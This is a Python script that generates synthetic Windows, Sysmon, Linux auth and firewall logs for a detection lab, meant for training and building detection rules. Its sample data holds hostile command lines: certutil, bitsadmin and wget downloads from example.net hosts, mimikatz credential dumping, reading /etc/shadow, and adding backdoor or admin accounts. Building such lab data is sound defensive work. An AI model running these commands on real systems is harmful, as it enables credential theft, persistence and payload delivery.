#!/usr/bin/env python3
"""
Detection Lab Log Generator
Generates Windows Event Logs, Sysmon logs, Linux auth logs and firewall logs
for security training and detection rule development.

The logs are written under LOG_DIR. Logstash picks them up from there.

Environment:
  LOG_DIR                 where the log files go (default /var/log/detection-lab)
  GENERATION_RATE         rounds per second (default 10)
  LOG_GENERATOR_SEED      fixed seed, so two runs write the same events apart from their timestamps
  LOG_GENERATOR_ROUNDS    stop after this many rounds instead of running until interrupted

External addresses come from the documentation ranges 203.0.113.0/24,
198.51.100.0/24 and 192.0.2.0/24 and outside host names from example.com,
example.net and example.org, so no line points at a real host.
"""

import json
import os
import random
import signal
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

from faker import Faker

fake = Faker()

# Configuration
LOG_DIR = os.environ.get('LOG_DIR', '/var/log/detection-lab')
GENERATION_RATE = int(os.environ.get('GENERATION_RATE', 10))

# Ensure log directories exist
for subdir in ['windows', 'linux', 'network']:
    Path(f"{LOG_DIR}/{subdir}").mkdir(parents=True, exist_ok=True)

# Common data for log generation
USERNAMES = ['administrator', 'admin', 'jsmith', 'mjohnson', 'agarcia', 'twang',
             'svc_backup', 'svc_sql', 'svc_web', 'guest', 'helpdesk', 'dbadmin']
DOMAINS = ['CORP', 'WORKGROUP', 'DETECTION-LAB', 'CONTOSO']
WORKSTATIONS = ['WS001', 'WS002', 'WS003', 'LAPTOP01', 'LAPTOP02', 'DC01', 'SRV001', 'SRV002']
PROCESSES = [
    'explorer.exe', 'chrome.exe', 'firefox.exe', 'outlook.exe', 'winword.exe',
    'excel.exe', 'powerpnt.exe', 'notepad.exe', 'cmd.exe', 'powershell.exe',
    'svchost.exe', 'services.exe', 'lsass.exe', 'csrss.exe', 'smss.exe',
    'taskmgr.exe', 'mmc.exe', 'regedit.exe', 'msiexec.exe', 'rundll32.exe'
]
SUSPICIOUS_PROCESSES = [
    'mimikatz.exe', 'psexec.exe', 'nc.exe', 'ncat.exe', 'certutil.exe',
    'bitsadmin.exe', 'wmic.exe', 'mshta.exe', 'regsvr32.exe', 'cscript.exe'
]
IP_RANGES = ['192.168.1', '10.0.0', '172.16.0']
EXTERNAL_IPS = ['203.0.113.', '198.51.100.', '192.0.2.']
SEED = os.environ.get('LOG_GENERATOR_SEED')
if SEED is not None:
    random.seed(int(SEED))
    Faker.seed(int(SEED))
ROUNDS = int(os.environ.get('LOG_GENERATOR_ROUNDS', 0))


def utcnow() -> datetime:
    return datetime.now(timezone.utc).replace(tzinfo=None)


def outside_host() -> str:
    """A made-up host name under a domain reserved for documentation."""
    return f"{fake.domain_word()}.{random.choice(['example.com', 'example.net', 'example.org'])}"


class WindowsEventGenerator:
    """Generates Windows Event Log entries."""

    def __init__(self, log_path):
        self.log_path = log_path

    def generate_event(self, event_id: int, **kwargs) -> dict:
        """Generate a Windows event with the specified event ID."""
        timestamp = utcnow().isoformat() + 'Z'

        event = {
            'EventID': event_id,
            'TimeCreated': timestamp,
            'Computer': random.choice(WORKSTATIONS),
            'Channel': 'Security',
            'Provider': 'Microsoft-Windows-Security-Auditing',
            'RecordID': random.randint(100000, 999999),
            **kwargs
        }
        return event

    def generate_logon_event(self, success: bool = True, source: str = '') -> dict:
        """Generate a logon event (4624 success, 4625 failure). A brute force names its one source address."""
        event_id = 4624 if success else 4625
        logon_types = {2: 'Interactive', 3: 'Network', 10: 'RemoteInteractive'}
        logon_type = random.choice(list(logon_types.keys()))

        return self.generate_event(
            event_id=event_id,
            SubjectUserSid='S-1-5-18',
            SubjectUserName='SYSTEM',
            SubjectDomainName='NT AUTHORITY',
            TargetUserName=random.choice(USERNAMES),
            TargetDomainName=random.choice(DOMAINS),
            LogonType=logon_type,
            LogonTypeName=logon_types[logon_type],
            IpAddress=source or f"{random.choice(IP_RANGES)}.{random.randint(1, 254)}",
            IpPort=random.randint(49152, 65535),
            WorkstationName=random.choice(WORKSTATIONS),
            LogonGuid=str(uuid.uuid4()),
            ProcessName='C:\\Windows\\System32\\svchost.exe'
        )

    def generate_process_creation(self, suspicious: bool = False) -> dict:
        """Generate a process creation event (4688)."""
        if suspicious:
            process = random.choice(SUSPICIOUS_PROCESSES)
            parent = random.choice(['cmd.exe', 'powershell.exe', 'explorer.exe'])
        else:
            process = random.choice(PROCESSES)
            parent = random.choice(['explorer.exe', 'services.exe', 'svchost.exe'])

        return self.generate_event(
            event_id=4688,
            SubjectUserName=random.choice(USERNAMES),
            SubjectDomainName=random.choice(DOMAINS),
            NewProcessId=hex(random.randint(1000, 65535)),
            NewProcessName=f'C:\\Windows\\System32\\{process}',
            TokenElevationType='%%1937',
            ProcessId=hex(random.randint(1000, 65535)),
            ParentProcessName=f'C:\\Windows\\System32\\{parent}',
            CommandLine=self._generate_command_line(process, suspicious)
        )

    def _generate_command_line(self, process: str, suspicious: bool) -> str:
        """Generate a realistic command line."""
        if not suspicious:
            return f'"{process}"'

        suspicious_commands = [
            'powershell.exe -enc JABjAGwAaQBlAG4AdAA=',
            'cmd.exe /c whoami && ipconfig /all',
            'certutil.exe -urlcache -split -f http://files.example.net/payload.exe',
            'bitsadmin /transfer job /download http://files.example.net/mal.exe C:\\mal.exe',
            'wmic process call create "cmd.exe /c powershell -nop -w hidden -c IEX"',
            'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run")',
            r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"',
            'regsvr32 /s /n /u /i:http://files.example.net/file.sct scrobj.dll'
        ]
        return random.choice(suspicious_commands)

    def generate_service_installed(self) -> dict:
        """Generate a service installation event (7045)."""
        services = [
            ('WindowsUpdate', 'C:\\Windows\\System32\\svchost.exe -k netsvcs'),
            ('PSEXESVC', 'C:\\Windows\\PSEXESVC.exe'),
            ('SuspiciousSvc', 'C:\\Temp\\payload.exe'),
            ('LegitService', 'C:\\Program Files\\App\\service.exe')
        ]
        service = random.choice(services)

        return self.generate_event(
            event_id=7045,
            ServiceName=service[0],
            ImagePath=service[1],
            ServiceType='user mode service',
            StartType='auto start',
            AccountName='LocalSystem',
            Channel='System',
            Provider='Service Control Manager'
        )

    def generate_special_privileges(self) -> dict:
        """Generate special privileges assigned event (4672)."""
        privileges = [
            'SeDebugPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege',
            'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege'
        ]

        return self.generate_event(
            event_id=4672,
            SubjectUserName=random.choice(USERNAMES),
            SubjectDomainName=random.choice(DOMAINS),
            PrivilegeList=random.sample(privileges, random.randint(1, 3))
        )

    def write_event(self, event: dict):
        """Write event to log file."""
        filepath = f"{self.log_path}/windows/events.json"
        with open(filepath, 'a') as f:
            f.write(json.dumps(event) + '\n')


class SysmonGenerator:
    """Generates Sysmon log entries."""

    def __init__(self, log_path):
        self.log_path = log_path

    def generate_event(self, event_id: int, **kwargs) -> dict:
        """Generate a Sysmon event."""
        timestamp = utcnow().isoformat() + 'Z'

        event = {
            'EventID': event_id,
            'UtcTime': timestamp,
            'Computer': random.choice(WORKSTATIONS),
            'Channel': 'Microsoft-Windows-Sysmon/Operational',
            'Provider': 'Microsoft-Windows-Sysmon',
            'ProcessGuid': str(uuid.uuid4()),
            **kwargs
        }
        return event

    def generate_process_create(self, suspicious: bool = False) -> dict:
        """Generate Sysmon Event ID 1 - Process Creation."""
        if suspicious:
            image = f'C:\\Temp\\{random.choice(SUSPICIOUS_PROCESSES)}'
            parent_image = random.choice([
                'C:\\Windows\\System32\\cmd.exe',
                'C:\\Windows\\System32\\powershell.exe',
                'C:\\Windows\\System32\\wscript.exe'
            ])
            command_line = self._get_suspicious_command()
        else:
            image = f'C:\\Windows\\System32\\{random.choice(PROCESSES)}'
            parent_image = f'C:\\Windows\\System32\\{random.choice(["explorer.exe", "services.exe", "svchost.exe"])}'
            command_line = image

        return self.generate_event(
            event_id=1,
            RuleName='ProcessCreate',
            ProcessId=random.randint(1000, 65535),
            Image=image,
            FileVersion='10.0.19041.1',
            Description='Windows Process',
            Company='Microsoft Corporation',
            OriginalFileName=os.path.basename(image),
            CommandLine=command_line,
            CurrentDirectory='C:\\Windows\\System32\\',
            User=f'{random.choice(DOMAINS)}\\{random.choice(USERNAMES)}',
            LogonGuid=str(uuid.uuid4()),
            LogonId=hex(random.randint(100000, 999999)),
            TerminalSessionId=random.randint(0, 5),
            IntegrityLevel='High',
            Hashes=f'SHA256={fake.sha256()}',
            ParentProcessGuid=str(uuid.uuid4()),
            ParentProcessId=random.randint(1000, 65535),
            ParentImage=parent_image,
            ParentCommandLine=parent_image,
            ParentUser=f'{random.choice(DOMAINS)}\\SYSTEM'
        )

    def _get_suspicious_command(self) -> str:
        """Generate suspicious command lines."""
        commands = [
            'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
            'cmd.exe /c "net user hacker Password123! /add && net localgroup administrators hacker /add"',
            'C:\\Temp\\mimikatz.exe "sekurlsa::logonpasswords" exit',
            'wmic /node:192.168.1.100 process call create "cmd.exe /c calc.exe"',
            'psexec.exe \\\\target -s cmd.exe',
            'certutil.exe -urlcache -split -f http://files.example.net/shell.exe C:\\Temp\\shell.exe',
            'rundll32.exe C:\\Temp\\malware.dll,DllMain'
        ]
        return random.choice(commands)

    def generate_network_connection(self, suspicious: bool = False) -> dict:
        """Generate Sysmon Event ID 3 - Network Connection."""
        if suspicious:
            dest_ip = f'{random.choice(EXTERNAL_IPS)}{random.randint(1, 254)}'
            dest_port = random.choice([4444, 8080, 443, 8443, 1337])
            image = f'C:\\Windows\\System32\\{random.choice(["powershell.exe", "cmd.exe", "rundll32.exe"])}'
        else:
            dest_ip = f'{random.choice(IP_RANGES)}.{random.randint(1, 254)}'
            dest_port = random.choice([80, 443, 445, 135, 139, 389, 3389])
            image = f'C:\\Windows\\System32\\{random.choice(PROCESSES)}'

        return self.generate_event(
            event_id=3,
            RuleName='NetworkConnect',
            ProcessId=random.randint(1000, 65535),
            Image=image,
            User=f'{random.choice(DOMAINS)}\\{random.choice(USERNAMES)}',
            Protocol='tcp',
            Initiated='true',
            SourceIsIpv6='false',
            SourceIp=f'{random.choice(IP_RANGES)}.{random.randint(1, 254)}',
            SourceHostname=random.choice(WORKSTATIONS),
            SourcePort=random.randint(49152, 65535),
            SourcePortName='',
            DestinationIsIpv6='false',
            DestinationIp=dest_ip,
            DestinationHostname=outside_host() if suspicious else random.choice(WORKSTATIONS),
            DestinationPort=dest_port,
            DestinationPortName=''
        )

    def generate_dns_query(self, suspicious: bool = False) -> dict:
        """Generate Sysmon Event ID 22 - DNS Query."""
        if suspicious:
            domains = [
                f'{fake.hexify(text="^^^^^^^^")}.evil-cdn.example.org',
                'c2.malware-domain.example.net',
                f'{fake.hexify(text="^^^^")}.{fake.hexify(text="^^^^")}.dnsexfil.example.org',
                'update.microsoft.com.evil-cdn.example.org'
            ]
            query_name = random.choice(domains)
        else:
            query_name = random.choice([
                'www.google.com', 'login.microsoftonline.com', 'graph.microsoft.com',
                'update.microsoft.com', 'www.office.com', outside_host()
            ])

        return self.generate_event(
            event_id=22,
            RuleName='DnsQuery',
            ProcessId=random.randint(1000, 65535),
            Image=f'C:\\Windows\\System32\\{random.choice(["chrome.exe", "firefox.exe", "explorer.exe", "powershell.exe"])}',
            QueryName=query_name,
            QueryStatus='0',
            QueryResults=f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
        )

    def generate_file_create(self, suspicious: bool = False) -> dict:
        """Generate Sysmon Event ID 11 - File Create."""
        if suspicious:
            target_filename = random.choice([
                'C:\\Temp\\payload.exe',
                'C:\\Users\\Public\\malware.dll',
                'C:\\Windows\\Temp\\shell.ps1',
                f'C:\\Users\\{random.choice(USERNAMES)}\\AppData\\Local\\Temp\\update.exe'
            ])
            image = 'C:\\Windows\\System32\\powershell.exe'
        else:
            extensions = ['.docx', '.xlsx', '.txt', '.pdf', '.log']
            target_filename = f'C:\\Users\\{random.choice(USERNAMES)}\\Documents\\{fake.file_name(extension=random.choice(extensions)[1:])}'
            image = random.choice([
                'C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE',
                'C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE',
                'C:\\Windows\\System32\\notepad.exe'
            ])

        return self.generate_event(
            event_id=11,
            RuleName='FileCreate',
            ProcessId=random.randint(1000, 65535),
            Image=image,
            TargetFilename=target_filename,
            CreationUtcTime=utcnow().isoformat() + 'Z',
            User=f'{random.choice(DOMAINS)}\\{random.choice(USERNAMES)}'
        )

    def generate_registry_event(self, suspicious: bool = False) -> dict:
        """Generate Sysmon Event ID 13 - Registry Value Set."""
        if suspicious:
            target_object = random.choice([
                'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware',
                'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence',
                'HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousSvc\\ImagePath',
                'HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute'
            ])
            details = random.choice([
                'C:\\Temp\\payload.exe',
                'powershell.exe -enc JABjAGwAaQBlAG4AdAA=',
                'C:\\Windows\\System32\\cmd.exe /c C:\\Temp\\shell.bat'
            ])
        else:
            target_object = random.choice([
                'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden',
                'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell',
                'HKCU\\Control Panel\\Desktop\\Wallpaper'
            ])
            details = random.choice(['1', '0', 'explorer.exe', 'C:\\Windows\\wallpaper.jpg'])

        return self.generate_event(
            event_id=13,
            RuleName='RegistryEvent',
            EventType='SetValue',
            ProcessId=random.randint(1000, 65535),
            Image=f'C:\\Windows\\System32\\{random.choice(["reg.exe", "regedit.exe", "powershell.exe"])}',
            TargetObject=target_object,
            Details=details,
            User=f'{random.choice(DOMAINS)}\\{random.choice(USERNAMES)}'
        )

    def write_event(self, event: dict):
        """Write event to log file."""
        filepath = f"{self.log_path}/windows/sysmon.json"
        with open(filepath, 'a') as f:
            f.write(json.dumps(event) + '\n')


class LinuxAuthGenerator:
    """Generates Linux authentication logs."""

    def __init__(self, log_path):
        self.log_path = log_path
        self.linux_users = ['root', 'ubuntu', 'admin', 'user', 'deploy', 'www-data']

    def generate_ssh_event(self, success: bool = True, brute_force: bool = False, source: str = '') -> str:
        """Generate SSH authentication log entry. A brute force names its one source address."""
        timestamp = utcnow().strftime('%b %d %H:%M:%S')
        hostname = random.choice(['srv001', 'srv002', 'web01', 'db01'])
        tag = f'sshd[{random.randint(1000, 65535)}]'
        port = random.randint(49152, 65535)

        if brute_force:
            # Password guessing against common account names. sshd calls an account
            # the host does not have an "invalid user".
            user = random.choice(['admin', 'root', 'test', 'user', fake.user_name()])
            src_ip = source or f'{random.choice(EXTERNAL_IPS)}{random.randint(1, 254)}'
            account = user if user in self.linux_users else f'invalid user {user}'
            return f'{timestamp} {hostname} {tag}: Failed password for {account} from {src_ip} port {port} ssh2'

        user = random.choice(self.linux_users)
        src_ip = f'{random.choice(IP_RANGES)}.{random.randint(1, 254)}'
        if success:
            return f'{timestamp} {hostname} {tag}: Accepted publickey for {user} from {src_ip} port {port} ssh2'
        method = random.choice(['password', 'publickey'])
        return f'{timestamp} {hostname} {tag}: Failed {method} for {user} from {src_ip} port {port} ssh2'

    def generate_sudo_event(self, suspicious: bool = False) -> str:
        """Generate sudo log entry."""
        timestamp = utcnow().strftime('%b %d %H:%M:%S')
        hostname = random.choice(['srv001', 'srv002', 'web01', 'db01'])
        user = random.choice(self.linux_users)

        if suspicious:
            commands = [
                '/bin/bash',
                '/usr/bin/passwd root',
                '/usr/bin/cat /etc/shadow',
                '/usr/bin/wget http://files.example.net/shell.sh',
                '/bin/chmod 777 /tmp/exploit',
                '/usr/sbin/useradd -o -u 0 backdoor'
            ]
        else:
            commands = [
                '/usr/bin/apt update',
                '/usr/bin/systemctl restart nginx',
                '/usr/bin/tail -f /var/log/syslog',
                '/usr/bin/ls /root',
                '/usr/bin/cat /etc/passwd'
            ]

        cmd = random.choice(commands)
        return f'{timestamp} {hostname} sudo: {user} : TTY=pts/{random.randint(0, 5)} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}'

    def generate_pam_event(self) -> str:
        """Generate PAM authentication event."""
        timestamp = utcnow().strftime('%b %d %H:%M:%S')
        hostname = random.choice(['srv001', 'srv002', 'web01', 'db01'])
        user = random.choice(self.linux_users)

        events = [
            f'{timestamp} {hostname} sshd[{random.randint(1000, 65535)}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)',
            f'{timestamp} {hostname} sshd[{random.randint(1000, 65535)}]: pam_unix(sshd:session): session closed for user {user}',
            f'{timestamp} {hostname} login[{random.randint(1000, 65535)}]: pam_unix(login:session): session opened for user {user} by LOGIN(uid=0)'
        ]
        return random.choice(events)

    def write_event(self, event: str):
        """Write event to log file."""
        filepath = f"{self.log_path}/linux/auth.log"
        with open(filepath, 'a') as f:
            f.write(event + '\n')


class FirewallLogGenerator:
    """Generates firewall logs."""

    def __init__(self, log_path):
        self.log_path = log_path

    def generate_event(self, port_scan: bool = False) -> str:
        """Generate a firewall log entry."""
        timestamp = utcnow().isoformat()

        if port_scan:
            src_ip = f'{random.choice(EXTERNAL_IPS)}{random.randint(1, 254)}'
            dst_ip = f'{random.choice(IP_RANGES)}.{random.randint(1, 254)}'
            dst_port = random.randint(1, 65535)
            action = 'BLOCK'
            protocol = 'TCP'
        else:
            src_ip = f'{random.choice(IP_RANGES)}.{random.randint(1, 254)}'
            dst_ip = f'{random.choice(IP_RANGES)}.{random.randint(1, 254)}'
            dst_port = random.choice([80, 443, 22, 3389, 445, 135, 139])
            action = random.choice(['ALLOW', 'ALLOW', 'ALLOW', 'BLOCK'])
            protocol = random.choice(['TCP', 'UDP'])

        src_port = random.randint(49152, 65535)
        return f'{timestamp} {action} {protocol} {src_ip}:{src_port} -> {dst_ip}:{dst_port}'

    def write_event(self, event: str):
        """Write event to log file."""
        filepath = f"{self.log_path}/network/firewall.log"
        with open(filepath, 'a') as f:
            f.write(event + '\n')


class LogGenerator:
    """Main log generation orchestrator."""

    def __init__(self):
        self.windows = WindowsEventGenerator(LOG_DIR)
        self.sysmon = SysmonGenerator(LOG_DIR)
        self.linux = LinuxAuthGenerator(LOG_DIR)
        self.firewall = FirewallLogGenerator(LOG_DIR)

        # Track attack scenarios
        self.attack_probability = 0.15  # 15% chance of suspicious activity

    def generate_normal_activity(self):
        """Generate normal baseline activity."""
        # Windows logons
        if random.random() < 0.3:
            self.windows.write_event(self.windows.generate_logon_event(success=True))

        # Process creation
        if random.random() < 0.4:
            self.windows.write_event(self.windows.generate_process_creation(suspicious=False))

        # Sysmon events
        if random.random() < 0.3:
            self.sysmon.write_event(self.sysmon.generate_process_create(suspicious=False))
        if random.random() < 0.2:
            self.sysmon.write_event(self.sysmon.generate_network_connection(suspicious=False))
        if random.random() < 0.3:
            self.sysmon.write_event(self.sysmon.generate_dns_query(suspicious=False))
        if random.random() < 0.1:
            self.sysmon.write_event(self.sysmon.generate_file_create(suspicious=False))

        # Linux auth
        if random.random() < 0.2:
            self.linux.write_event(self.linux.generate_ssh_event(success=True))
        if random.random() < 0.1:
            self.linux.write_event(self.linux.generate_sudo_event(suspicious=False))
        if random.random() < 0.15:
            self.linux.write_event(self.linux.generate_pam_event())

        # Firewall
        if random.random() < 0.3:
            self.firewall.write_event(self.firewall.generate_event(port_scan=False))

    def generate_attack_activity(self):
        """Generate suspicious/attack activity."""
        attack_type = random.choice([
            'brute_force', 'suspicious_process', 'c2_communication',
            'lateral_movement', 'persistence', 'data_exfil'
        ])

        if attack_type == 'brute_force':
            # Multiple failed logins from one outside address, so a rule that counts
            # failures per source address has something to count
            attacker = f'{random.choice(EXTERNAL_IPS)}{random.randint(1, 254)}'
            for _ in range(random.randint(5, 15)):
                self.windows.write_event(self.windows.generate_logon_event(success=False, source=attacker))
                self.linux.write_event(
                    self.linux.generate_ssh_event(success=False, brute_force=True, source=attacker))
            # Maybe one success at the end
            if random.random() < 0.3:
                self.windows.write_event(self.windows.generate_logon_event(success=True))

        elif attack_type == 'suspicious_process':
            self.windows.write_event(self.windows.generate_process_creation(suspicious=True))
            self.sysmon.write_event(self.sysmon.generate_process_create(suspicious=True))
            self.windows.write_event(self.windows.generate_special_privileges())
            self.linux.write_event(self.linux.generate_sudo_event(suspicious=True))

        elif attack_type == 'c2_communication':
            for _ in range(random.randint(3, 8)):
                self.sysmon.write_event(self.sysmon.generate_network_connection(suspicious=True))
                self.sysmon.write_event(self.sysmon.generate_dns_query(suspicious=True))

        elif attack_type == 'lateral_movement':
            self.windows.write_event(self.windows.generate_service_installed())
            self.sysmon.write_event(self.sysmon.generate_process_create(suspicious=True))
            self.sysmon.write_event(self.sysmon.generate_network_connection(suspicious=True))

        elif attack_type == 'persistence':
            self.sysmon.write_event(self.sysmon.generate_registry_event(suspicious=True))
            self.sysmon.write_event(self.sysmon.generate_file_create(suspicious=True))
            self.windows.write_event(self.windows.generate_service_installed())

        elif attack_type == 'data_exfil':
            self.sysmon.write_event(self.sysmon.generate_file_create(suspicious=True))
            for _ in range(random.randint(5, 10)):
                self.sysmon.write_event(self.sysmon.generate_network_connection(suspicious=True))

        # Port scan from firewall
        if random.random() < 0.4:
            for _ in range(random.randint(10, 30)):
                self.firewall.write_event(self.firewall.generate_event(port_scan=True))

    def run(self):
        """Main generation loop."""
        print(f"Starting log generation (rate: {GENERATION_RATE} events/second)")
        print(f"Writing logs to: {LOG_DIR}")

        rounds = 0
        while not ROUNDS or rounds < ROUNDS:
            rounds += 1
            # Generate normal activity
            self.generate_normal_activity()

            # Occasionally generate attack activity
            if random.random() < self.attack_probability:
                print(f"[{utcnow().isoformat(timespec='seconds')}] Generating attack activity...")
                self.generate_attack_activity()

            # Sleep based on generation rate. A bounded run is for tests and does not wait.
            if not ROUNDS:
                time.sleep(1.0 / GENERATION_RATE)


def stop(_signal, _frame):
    """`docker compose stop` sends SIGTERM. Leave at once instead of waiting to be killed."""
    sys.exit(0)


if __name__ == '__main__':
    signal.signal(signal.SIGTERM, stop)
    generator = LogGenerator()
    try:
        generator.run()
    except KeyboardInterrupt:
        pass
